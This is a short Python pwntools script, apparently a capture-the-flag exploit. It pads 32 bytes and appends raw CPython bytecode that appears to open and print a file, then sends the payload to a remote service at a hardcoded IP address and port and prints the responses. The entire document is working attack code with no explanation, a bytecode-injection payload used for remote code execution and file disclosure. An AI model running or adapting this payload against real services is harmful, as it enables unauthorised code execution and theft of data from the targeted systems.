from pwn import *

bc = 't\x00d\x01d\x02\x83\x02}\x00t\x01|\x00\xa0\x02\xa1\x00\x83\x01\x01\x00d\x00S\x00'
payload = 'A'*32
payload+=bc
p = remote('95.216.233.106',25616)
print p.recvuntil('?\n')
p.sendline(payload)
print p.recv()
print p.recv()
